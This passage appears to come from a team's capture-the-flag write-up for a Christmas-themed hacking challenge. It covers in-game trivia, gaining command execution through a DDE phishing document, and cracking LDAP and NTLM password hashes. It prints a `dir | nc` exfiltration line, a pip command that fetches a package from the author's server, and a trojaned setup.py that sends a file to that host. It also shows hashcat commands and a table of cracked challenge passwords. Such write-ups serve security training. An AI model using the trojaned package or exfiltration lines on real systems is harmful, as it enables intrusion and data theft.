<div id="outline-container-orga7d20aa" class="outline-4">
<h4 id="orga7d20aa">Exploration</h4>
<div class="outline-text-4" id="text-orga7d20aa">
</div>
<ul class="org-ul">
<li><a id="org7b38b48"></a>Star Wars robots references in <a href="http://nppd.northpolechristmastown.com/robots.txt">http://nppd.northpolechristmastown.com/robots.txt</a><br />
<div class="outline-text-5" id="text-org7b38b48">
<p>
The robots.txt page for the nppd site has a number of robot references as user-agents.
</p>
<ul class="org-ul">
<li>hk-47, a hunter-killer assassin droid</li>
<li>threepio, an obvious reference to C3PO. There's a sand-crawler-delay variable set to '421' which could be a reference to the storm trooper, TK-421, who was abushed on the Millenium Falcon, and incidentally is also the only named Storm Trooper in the original trilogy.</li>
<li>artoo, an obvious reference to R2D2. There's a sand-craler-delay variable set to '2187' which is likely a reference to the cell that Princess Leia was in on the Death Star.</li>
</ul>
</div>
</li>

<li><a id="orgd8858d0"></a>Munchkins<br />
<div class="outline-text-5" id="text-orgd8858d0">
<p>
In the Munchin BOLO, the munchkins disappeared after speaking something that sounded like 'puuurzgexgull'. This is most likely a reference to the word 'pyrzqxgl' which was a word described in the book 'The Magic of Oz'. A munchkin, incidentally named 'Bini Aru', like the munchkin in the BOLO, wrote down how to pronounce the word. The word was magical and could be used to transform a being into a different creature. Also, Boq is another munchkin named in the Land of Oz book series.
</p>
</div>
</li>

<li><a id="orgf445558"></a>Reindeer Speak<br />
<div class="outline-text-5" id="text-orgf445558">
<pre class="example">
hhhhhhhhhhhhhh723yhmn03z2784mn1

4cv24 2 342 34 zx5p2342zx1

42

10xc 3912 934u xd528034y2dnryhrhndr23n 234f 2bd4 5  8g 7238g4508 s23425


On 11/15/2017 11:18 AM, admin@northpolechristmastown.com wrote:
&gt; Keep up the good job reindeer!
&gt;
&gt;
&gt; On 11/15/2017 11:17 AM, reindeer@northpolechristmastown.com wrote:
&gt;&gt; t68 2`x4-`8- 28- 5t 3y=8 m89 cfqlhmniuxdk.hszv3ct79p137p2p t78 23t80
&gt;&gt; x 601x
&gt;&gt;
&gt;&gt; http://ghk.h-cdn.co/assets/cm/15/11/640x480/54ffe5266025c-dog1.jpg
&gt;&gt;
&gt;&gt; On 11/15/2017 10:28 AM, admin@northpolechristmastown.com wrote:
&gt;&gt;&gt; Hi,
&gt;&gt;&gt;
&gt;&gt;&gt; Welcome to your new account.
&gt;&gt;
&gt;
</pre>

<p>
The reindeer appear to be speaking. Or randomly typing.
</p>


<div class="figure">
<p><img src="./images/54ffe5266025c-dog1.jpg" alt="54ffe5266025c-dog1.jpg" width="300px" />
</p>
</div>
</div>
</li>
</ul>
</div>
</div>
</div>
<div id="outline-container-orga6c7ef6" class="outline-2">
<h2 id="orga6c7ef6">Appendices</h2>
<div class="outline-text-2" id="text-orga6c7ef6">
</div>
<div id="outline-container-org5542774" class="outline-3">
<h3 id="org5542774">Command Execution with pip</h3>
<div class="outline-text-3" id="text-org5542774">
<p>
Early on in the challenge, the EWA and EMI systems had some reliabilty issues.
Using the DDE exploit it took a while to get any command execution to work.
Any attempt to run a more complicated command would fail.
</p>

<p>
I wasn't sure if my commands were failing due to quoting or escapting issues or
even how to tell.  Eventually it was determined that even a previously known
working <code>dir | nc host port</code> command was failing almsot every time.  Any
experiment I could come up with was tainted by the lack of reliability on the
backend.  Not only was it a blind command injection exploit, but if an attempt
failed I had no way of knowing why.  I needed to run something I KNEW would
work that would also confirm it had been executed.
</p>

<p>
I was able to use <code>dir</code> and <code>nc</code> to determine that python was installed, and I
was able to run <code>python -V</code>.  Once I knew I could run python and pass it
arguments, I ran <abbr title="the standard python package installation tool"> pip</abbr>
</p>

<pre class="example">
python -m pip install https://my.vps.domain/test.tar.gz
</pre>

<p>
A minute later, I got a hit for test.tar.gz!  The benefit of this method is
that the command itself does not require any special characters that may need
escaping.  There are no quotes or pipes or backslahes to worry about.  The fact
that <code>pip</code> will initially request the file from my server also meant I knew the
phish+dde exploit worked.  I could use this method as a solid base to run
further experiments.  Once the <code>pip</code> command was worked out, the docx file did
not need to be changed between runs.
</p>

<p>
With <code>pip</code> working, it was a simple matter of putting together a trojaned
setup.py in the style of <a href="https://twitter.com/JustinAzoff/status/881163562739277824">previous shenanigans seen in the wild</a>
</p>

<p>
The first trojaned package was written by hand:
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">setup.py</span>
<span style="color: #b5bd68;">from</span> distutils.core <span style="color: #b5bd68;">import</span> setup
setup(name=<span style="color: #8abeb7;">'upload_doc'</span>,
      version=<span style="color: #8abeb7;">'1.2'</span>,
)
<span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">hax</span>

<span style="color: #b5bd68;">try</span>:
    <span style="color: #b5bd68;">import</span> base64
    <span style="color: #b5bd68;">import</span> socket
    <span style="color: #b5bd68;">with</span> <span style="color: #b294bb;">open</span>(<span style="color: #8abeb7;">"C:/GreatBookPage7.pdf"</span>, <span style="color: #8abeb7;">"rb"</span>) <span style="color: #b5bd68;">as</span> f:
        <span style="color: #f0c674;">document</span> = f.read()
    <span style="color: #f0c674;">encoded</span> = base64.encodestring(document)

    <span style="color: #f0c674;">s</span>=socket.socket()
    s.connect((<span style="color: #8abeb7;">'my.vps.domain'</span>,44665))
    s.send(encoded)
    s.close()
<span style="color: #b5bd68;">except</span> <span style="color: #81a2be;">Exception</span> <span style="color: #b5bd68;">as</span> e:
    <span style="color: #b5bd68;">print</span>(<span style="color: #8abeb7;">"oops"</span>)
    <span style="color: #b5bd68;">print</span>(e)
</pre>
</div>

<p>
I then ran
</p>

<pre class="example">
python setup.py sdist
</pre>

<p>
to build the upload_doc-1.2.tar.gz tarball.  By copying this file to my vps,
and having pip install it, it would run my python code.  Unfortunately EWA/EMI
was having a lot of issues at this time, and it took almost 2 days before I was
able to see this work.  Fortunately, because I was now using a known good docx
file, I knew the problem was not on my end.
</p>

<p>
The trojanpkg.py module automates this by building a tarball in memory based on
an arbitrary injected code block.  This enables the destination address to be
templated in on the fly, instead of hardcoded in the package.  This enabled
other members of my team to run the exploit code without having to edit the
source to match their environment.
</p>

<p>
The trojanpkgweb.py module builds on top of trojanpkg.py to start up a web
server that dynamically serves up a trojaned package for any url.
</p>
</div>
</div>
<div id="outline-container-org0ebb181" class="outline-3">
<h3 id="org0ebb181">Cracking Passphrases</h3>
<div class="outline-text-3" id="text-org0ebb181">
</div>
<div id="outline-container-org9c4a0f4" class="outline-4">
<h4 id="org9c4a0f4">Finding a Wordlist</h4>
<div class="outline-text-4" id="text-org9c4a0f4">
<p>
In question 2, we found Alabaster's password, which was pretty strong:
<code>stream_unhappy_buy_loss</code>. During the course of the Hack, we found
some other passwords, but were only able to crack Santa's password
with a simple wordlist. Let's do some digging and see if we can't
figure out how Alabaster's password was generated.
</p>

<p>
Googling doesn't help too much, but a GitHub code search does. Searching for <code>stream unhappy buy loss passphrase</code>, the 8th result is pw.py:
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">!/usr/bin/env python3</span>
<span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">coding=utf-8</span>

<span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">Thanks to http://passphra.se/</span>
<span style="color: #f0c674;">words</span> = [
<span style="color: #8abeb7;">"ability"</span>,<span style="color: #8abeb7;">"able"</span>,<span style="color: #8abeb7;">"aboard"</span>,<span style="color: #8abeb7;">"about"</span>,<span style="color: #8abeb7;">"above"</span>,<span style="color: #8abeb7;">"accept"</span>,<span style="color: #8abeb7;">"accident"</span>,<span style="color: #8abeb7;">"according"</span>,
<span style="color: #8abeb7;">"account"</span>,<span style="color: #8abeb7;">"accurate"</span>,<span style="color: #8abeb7;">"acres"</span>,<span style="color: #8abeb7;">"across"</span>,<span style="color: #8abeb7;">"act"</span>,<span style="color: #8abeb7;">"action"</span>,<span style="color: #8abeb7;">"active"</span>,<span style="color: #8abeb7;">"activity"</span>,
<span style="color: #8abeb7;">"actual"</span>,<span style="color: #8abeb7;">"actually"</span>,<span style="color: #8abeb7;">"add"</span>,<span style="color: #8abeb7;">"addition"</span>,<span style="color: #8abeb7;">"additional"</span>,<span style="color: #8abeb7;">"adjective"</span>,<span style="color: #8abeb7;">"adult"</span>,<span style="color: #8abeb7;">"adventure"</span>,
<span style="color: #8abeb7;">"advice"</span>,<span style="color: #8abeb7;">"affect"</span>,<span style="color: #8abeb7;">"afraid"</span>,<span style="color: #8abeb7;">"after"</span>,<span style="color: #8abeb7;">"afternoon"</span>,<span style="color: #8abeb7;">"again"</span>,<span style="color: #8abeb7;">"against"</span>,<span style="color: #8abeb7;">"age"</span>,
<span style="color: #8abeb7;">"ago"</span>,<span style="color: #8abeb7;">"agree"</span>,<span style="color: #8abeb7;">"ahead"</span>,<span style="color: #8abeb7;">"aid"</span>,<span style="color: #8abeb7;">"air"</span>,<span style="color: #8abeb7;">"airplane"</span>,<span style="color: #8abeb7;">"alike"</span>,<span style="color: #8abeb7;">"alive"</span>,
<span style="color: #8abeb7;">"all"</span>,<span style="color: #8abeb7;">"allow"</span>,<span style="color: #8abeb7;">"almost"</span>,<span style="color: #8abeb7;">"alone"</span>,<span style="color: #8abeb7;">"along"</span>,<span style="color: #8abeb7;">"aloud"</span>,<span style="color: #8abeb7;">"alphabet"</span>,<span style="color: #8abeb7;">"already"</span>,
...
</pre>
</div>

<p>
We can verify that all 4 of the words are in that list. The code is
even nice enough to link us to <a href="http://passphra.se/">http://passphra.se/</a>, which seems like
it'd be a handy service for anyone wanting to create some quick
passwords.
</p>

<p>
In question 8, we recovered some LDAP password hashes. Let's see if we
can't crack more of those. Hashcat is our password cracker of choice,
but it can't do passphrases from a word list. We only have 1,949
words, and his password had 4 words chosen, so we can create a file
with all the two-word combinations, then use Hashcat's combinator mode
to try all combinations of two words on the left half and two words on
the right half.
</p>

<p>
We'll start by downloading the pw.py file that we found, and then a quick script will create our 2-word combos:
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">!/usr/bin/env python3</span>
<span style="color: #b5bd68;">import</span> itertools

<span style="color: #b5bd68;">import</span> pw

<span style="color: #b5bd68;">for</span> x <span style="color: #b5bd68;">in</span> itertools.permutations(pw.words, 2):
    <span style="color: #b5bd68;">print</span>(<span style="color: #8abeb7;">' '</span>.join(x))
</pre>
</div>

<p>
Some Makefile targets to help:
</p>

<pre class="example">
password_hashes.txt: edb.json
	cat edb.json |jq '.[][][]' -c|grep userPassword | jq '"\(.mail[0]):\(.userPassword[0])"' -r &gt; password_hashes.txt

password_combos.txt: ../tools/gen_password_combos.py
	../tools/gen_password_combos.py &gt; password_combos.txt
	ls -lh password_combos.txt
	wc -l password_combos.txt

ldap_hashcat.txt: password_hashes.txt password_combos.txt
	hashcat -m 0  -a 1 password_hashes.txt password_combos.txt  password_combos.txt -j ' ' --username || true
	hashcat -m 0  -a 1 password_hashes.txt password_combos.txt  password_combos.txt -j ' ' --username --show | tee ldap_hashcat.txt
</pre>

<p>
And then we can create our combos:
</p>

<pre class="example">
$ make password_combos.txt
../tools/gen_password_combos.py &gt; password_combos.txt
ls -lh password_combos.txt
-rw-r--r--  1 vladg  staff    48M Jan 10 17:29 password_combos.txt
wc -l password_combos.txt
 3796652 password_combos.txt
</pre>

<p>
A 50 MB file is quite reasonable. Next up, we'll fire up Hashcat:
</p>

<pre class="example">
$ make ldap_hashcat.txt
hashcat -m 0 -a 1 password_hashes.txt password_combos.txt  password_combos.txt -j ' ' --username || true
</pre>

<p>
On a laptop, performance isn't great. So we got an AWS GPU cracking rig.
</p>

<pre class="example">
Session..........: hashcat
Status...........: Cracked
Hash.Type........: NTLM
Hash.Target......: emi.hashes
Time.Started.....: Wed Jan 10 14:15:06 2018 (1 minute 8 secs)
Time.Estimated...: Wed Jan 10 14:16:14 2018 (0 secs)
Guess.Base.......: File (password_combos_left_underscore.txt), Left Side
Guess.Mod........: File (password_combos_right_underscore.txt), Right Side
Speed.Dev.#1.....: 27490.8 MH/s (15.27ms)
Speed.Dev.#2.....: 27306.9 MH/s (15.27ms)
Speed.Dev.#3.....: 27213.1 MH/s (15.31ms)
Speed.Dev.#4.....: 27282.2 MH/s (15.28ms)
Speed.Dev.#5.....: 27210.4 MH/s (15.26ms)
Speed.Dev.#6.....: 27154.5 MH/s (15.29ms)
Speed.Dev.#7.....: 27160.6 MH/s (15.29ms)
Speed.Dev.#8.....: 27380.2 MH/s (15.31ms)
Speed.Dev.#*.....:   218.2 GH/s
</pre>

<p>
This behemoth can run through all 4-word password combinations for NTLM using the wordlist in about a minute. And running it for a minute costs less than a dollar!
</p>

<div class="tip">
<p>
When spinning up expensive AWS instances, don't go to sleep with them idling.
</p>

</div>

<p>
Here are the passwords we were able to crack this way:
</p>

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-left" />

<col  class="org-left" />

<col  class="org-left" />

<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">User</th>
<th scope="col" class="org-left">Hash</th>
<th scope="col" class="org-left">Password</th>
<th scope="col" class="org-left">Source</th>
<th scope="col" class="org-left">Type</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">alabaster.snowball</td>
<td class="org-left">17e22cc100b1806cdc3cf3b99a3480b5</td>
<td class="org-left">power instrument gasoline film</td>
<td class="org-left">EDB LDAP</td>
<td class="org-left">MD5</td>
</tr>

<tr>
<td class="org-left">bushy.evergreen</td>
<td class="org-left">3d32700ab024645237e879d272ebc428</td>
<td class="org-left">reason fight carried pack</td>
<td class="org-left">EDB LDAP</td>
<td class="org-left">MD5</td>
</tr>

<tr>
<td class="org-left">holly.evergreen</td>
<td class="org-left">031ef087617c17157bd8024f13bd9086</td>
<td class="org-left">research accept cent did</td>
<td class="org-left">EDB LDAP</td>
<td class="org-left">MD5</td>
</tr>

<tr>
<td class="org-left">jessica.claus</td>
<td class="org-left">16268da802de6a2efe9c672ca79a7071</td>
<td class="org-left">in attention court daughter</td>
<td class="org-left">EDB LDAP</td>
<td class="org-left">MD5</td>
</tr>

<tr>
<td class="org-left">mary.sugerplum</td>
<td class="org-left">b9c124f223cdc64ee2ae6abaeffbcbfe</td>
<td class="org-left">mark poem doll subject</td>
<td class="org-left">EDB LDAP</td>
<td class="org-left">MD5</td>
</tr>

<tr>
<td class="org-left">minty.candycane</td>
<td class="org-left">bcf38b6e70b907d51d9fa4154954f992</td>
<td class="org-left">tight mass season may</td>
<td class="org-left">EDB LDAP</td>
<td class="org-left">MD5</td>
</tr>

<tr>
<td class="org-left">pepper.minstix</td>
<td class="org-left">d0930efed8e75d7c8ed2e7d8e1d04e81</td>
<td class="org-left">wolf how policeman dance</td>
<td class="org-left">EDB LDAP</td>
<td class="org-left">MD5</td>
</tr>

<tr>
<td class="org-left">shimmy.upatree</td>
<td class="org-left">d0930efed8e75d7c8ed2e7d8e1d04e81</td>
<td class="org-left">wolf how policeman dance</td>
<td class="org-left">EDB LDAP</td>
<td class="org-left">MD5</td>
</tr>

<tr>
<td class="org-left">sparkle.redberry</td>
<td class="org-left">82161cf4b4c1d94320200dfe46f0db4c</td>
<td class="org-left">receive couple late copy</td>
<td class="org-left">EDB LDAP</td>
<td class="org-left">MD5</td>
</tr>

<tr>
<td class="org-left">tarpin.mcjinglehauser</td>
<td class="org-left">f259e9a289c4633fc1e3ab11b4368254</td>
<td class="org-left">dozen age nation blind</td>
<td class="org-left">EDB LDAP</td>
<td class="org-left">MD5</td>
</tr>

<tr>
<td class="org-left">wunorse.openslae</td>
<td class="org-left">9fd69465699288ddd36a13b5b383e937</td>
<td class="org-left">comfortable world yellow jungle</td>
<td class="org-left">EDB LDAP</td>
<td class="org-left">MD5</td>
</tr>

<tr>
<td class="org-left">alabaster_snowball</td>
<td class="org-left">10e2fa00c44d10ca05d399f47ed13351</td>
<td class="org-left">Carried_mass_it_reader1</td>
<td class="org-left">EMI</td>
<td class="org-left">NTLM</td>
</tr>
</tbody>
</table>
</div>
</div>
</div>
<div id="outline-container-org5350643" class="outline-3">
<h3 id="org5350643">Collaboration</h3>
</div>
<div id="outline-container-orgeb85717" class="outline-3">
<h3 id="orgeb85717">Command Reference</h3>
</div>
<div id="outline-container-org7aa75f4" class="outline-3">
<h3 id="org7aa75f4">External Resources</h3>
</div>
</div>
</div>
<div id="postamble" class="status">
<p class="author">Author: NCSA Security Team</p>
<p class="validation"><a href="http://validator.w3.org/check?uri=referer">Validate</a></p>
</div>
</body>
</html>
